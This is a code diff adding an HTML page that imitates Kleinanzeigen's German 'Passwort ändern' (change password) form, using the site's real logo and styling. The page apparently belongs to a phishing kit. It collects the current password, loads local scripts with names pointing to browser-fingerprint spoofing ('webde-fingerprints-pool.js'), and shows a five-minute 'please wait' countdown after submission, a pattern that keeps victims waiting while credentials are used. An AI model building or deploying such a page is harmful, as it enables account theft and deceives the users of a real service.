@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="de" dir="auto" data-color-scheme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>Passwort ändern — Kleinanzeigen</title>
+<link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.173.2/css/main_wcag_compliant.cdn.min.css">
+<style>
+:root, .af-custom-form-container .af-form { --primary-color: #B5E941; --button-font-color: #1D4B00; }
+:root { --page-background-color: #ffffff; --secondary-button-border-color: #95958E; --link-color: #326916; --title-font-color: #0C0C0B; --font-default-color: #0C0C0B; --widget-background-color: #ffffff; --font-light-color: #77756F; --input-text-color: #0C0C0B; --input-border-color: #95958E; --input-background-color: #ffffff; --icon-default-color: #0C0C0B; --error-color: #B30C0C; --border-radius-outer: 16px; --spacing: 8px; --spacing-2: calc(var(--spacing)*2); --spacing-3: calc(var(--spacing)*3); --button-height: 44px; --input-height: 44px; --input-border-radius: 8px; --button-border-radius: 9999px; }
+:root[data-color-scheme="dark"] { --page-background-color: #121212; --widget-background-color: #1e1e1e; --font-default-color: #ffffff; --title-font-color: #ffffff; --font-light-color: #a1a1aa; --input-background-color: #2c2c2c; --input-border-color: #555555; --input-text-color: #ffffff; --link-color: #b5e941; }
+@media (prefers-color-scheme: dark) { :root[data-color-scheme="system"] { --page-background-color: #121212; --widget-background-color: #1e1e1e; --font-default-color: #ffffff; --title-font-color: #ffffff; --font-light-color: #a1a1aa; --input-background-color: #2c2c2c; --input-border-color: #555555; --input-text-color: #ffffff; --link-color: #b5e941; } }
+html, body { margin: 0; padding: 0; background: var(--page-background-color); color: var(--font-default-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; min-height: 100vh; box-sizing: border-box; }
+.knz-header { position: sticky; top: 0; z-index: 999; background: var(--widget-background-color); text-align: center; height: 50px; width: 100%; padding: 12px 0; border-bottom: 1px solid #dddbd5; box-sizing: border-box; }
+.knz-header__logo-link { display: inline-block; }
+.knz-header__logo-img { height: 32px; width: auto; vertical-align: middle; display: block; }
+.knz-header__back { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--link-color); text-decoration: none; }
+.knz-header__back svg { width: 24px; height: 24px; display: block; }
+@media (min-width: 601px) {
+  .knz-header { height: 72px; padding: 16px 0; }
+  .knz-header__logo-img { height: 48px; }
+  .knz-header__back { margin-top: 4px; }
+}
+.knz-password-wrap { display: flex; align-items: center; width: 100%; border: 1px solid var(--input-border-color); border-radius: var(--input-border-radius); background: var(--input-background-color); min-height: var(--input-height); box-sizing: border-box; }
+.knz-password-wrap input { border: 0; background: transparent; flex: 1; min-width: 0; padding: 0 12px; font-size: 1rem; color: var(--input-text-color); outline: none; }
+.knz-password-wrap input::placeholder { color: var(--font-light-color); }
+.knz-password-wrap .btn-toggle { flex-shrink: 0; padding: 0 12px; border: 0; background: transparent; color: var(--icon-default-color); cursor: pointer; }
+.knz-change-page { max-width: 500px; margin: 0 auto; padding: 24px 16px; }
+.knz-change-page h1 { font-size: 1.25rem; font-weight: 700; color: var(--title-font-color); margin: 0 0 8px; }
+.knz-change-page .sub { font-size: 0.9375rem; color: var(--font-light-color); margin-bottom: 20px; }
+.knz-field { margin-bottom: 16px; }
+.knz-field label { display: block; font-size: 0.875rem; font-weight: 500; margin-bottom: 6px; color: var(--font-default-color); }
+.knz-btn-submit { display: flex; align-items: center; justify-content: center; width: 100%; min-height: var(--button-height); padding: 4px var(--spacing-2); margin-top: var(--spacing-3); font-family: inherit; font-size: 0.875rem; font-weight: 700; color: var(--button-font-color); background: var(--primary-color); border: 0; border-radius: var(--button-border-radius); cursor: pointer; box-sizing: border-box; }
+.knz-btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
+.knz-error { font-size: 0.875rem; color: var(--error-color); margin-top: 8px; display: none; }
+.knz-error.visible { display: block; }
+.knz-password-wrap.error { border-color: var(--error-color); }
+.knz-wait-overlay { position: fixed; inset: 0; z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; background: rgba(0,0,0,0.5); box-sizing: border-box; }
+.knz-wait-overlay[hidden] { display: none !important; }
+.knz-wait-box { background: var(--widget-background-color); border-radius: var(--border-radius-outer); padding: 28px 24px; max-width: 400px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,0.2); text-align: center; }
+.knz-wait-box h2 { font-size: 1.125rem; font-weight: 700; color: var(--title-font-color); margin: 0 0 14px; }
+.knz-wait-box p { font-size: 0.9375rem; line-height: 1.5; color: var(--font-default-color); margin: 0 0 8px; }
+.knz-wait-countdown { font-size: 1.75rem; font-weight: 700; color: var(--link-color); margin-top: 16px; font-variant-numeric: tabular-nums; }
+</style>
+</head>
+<body>
+  <header class="knz-header">
+    <a href="#" id="knz-back" class="knz-header__back" aria-label="Zurück">
+      <svg viewBox="0 0 12 12" fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M7.5 2 4 6l3.5 4"></path></svg>
+    </a>
+    <a href="https://www.kleinanzeigen.de" class="knz-header__logo-link">
+      <img class="knz-header__logo-img" src="https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-horizontal.svg" alt="Kleinanzeigen">
+    </a>
+  </header>
+
+  <main class="knz-change-page">
+    <h1>Passwort ändern</h1>
+    <p class="sub">Geben Sie Ihr aktuelles Passwort und ein neues Passwort ein.</p>
+    <form id="form-change-klein" novalidate>
+      <div class="knz-field">
+        <label for="current-password">Aktuelles Passwort</label>
+        <div class="knz-password-wrap" id="wrap-current">
+          <input type="password" id="current-password" name="currentPassword" placeholder="Aktuelles Passwort" autocomplete="current-password" required>
+          <button type="button" class="btn-toggle" id="toggle-current" aria-label="Passwort anzeigen">Anzeigen</button>
+        </div>
+      </div>
+      <div class="knz-field">
+        <label for="new-password">Neues Passwort</label>
+        <div class="knz-password-wrap" id="wrap-new">
+          <input type="password" id="new-password" name="newPassword" placeholder="Neues Passwort" autocomplete="new-password" required>
+          <button type="button" class="btn-toggle" id="toggle-new" aria-label="Passwort anzeigen">Anzeigen</button>
+        </div>
+      </div>
+      <p class="knz-error" id="error-change" role="alert"></p>
+      <button type="submit" class="knz-btn-submit" id="btn-submit">Passwort ändern</button>
+    </form>
+  </main>
+
+  <div id="knz-wait-overlay" class="knz-wait-overlay" hidden aria-live="polite">
+    <div class="knz-wait-box">
+      <h2>Bitte warten</h2>
+      <p>Wir prüfen Ihre Angaben und aktualisieren Ihr Passwort.</p>
+      <p class="knz-wait-countdown" id="knz-wait-countdown">5:00</p>
+      <p style="font-size: 0.875rem; color: var(--font-light-color); margin-top: 8px;">Dies kann bis zu 5 Minuten dauern.</p>
+    </div>
+  </div>
+
+  <script src="/webde-fingerprints-pool.js"></script>
+  <script src="/fingerprint.js"></script>
+  <script src="/change-password-klein.js"></script>
+</body>
+</html>
